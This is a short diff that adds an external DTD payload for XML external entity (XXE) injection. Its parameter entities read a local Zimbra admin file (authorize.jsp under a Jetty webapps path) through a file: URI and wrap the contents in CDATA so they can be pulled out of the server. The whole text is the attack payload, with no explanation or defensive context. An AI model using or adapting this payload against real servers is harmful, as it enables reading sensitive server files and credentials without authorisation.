@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:../jetty-distribution-9.3.5.v20151012/webapps/zimbraAdmin/public/authorize.jsp">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
